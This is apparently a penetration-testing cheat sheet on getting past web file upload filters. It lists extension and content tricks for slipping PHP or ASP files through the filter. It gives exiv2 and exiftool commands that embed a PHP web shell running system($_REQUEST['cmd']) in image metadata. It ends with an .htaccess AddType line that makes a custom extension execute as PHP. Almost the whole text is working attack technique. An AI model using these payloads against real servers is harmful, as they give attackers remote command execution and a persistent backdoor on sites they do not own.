### Bypassing File Upload Restrictions
* file.php -&gt; file.jpg
* file.php -&gt; file.php.jpg
* file.asp -&gt; file.asp;.jpg
* file.gif \(contains php code, but starts with string GIF/GIF98\)
* 00%
* file.jpg with php backdoor in exif \(see below\)
* .jpg -&gt; proxy intercept -&gt; rename to .php
### Injecting PHP into JPEG
```
exiv2 -c'A "<?php system($_REQUEST['cmd']);?>"!' backdoor.jpeg
exiftool “-comment<=back.php” back.png
```
### Uploading .htaccess to interpret .blah as .php
AddType application/x-httpd-php .blah
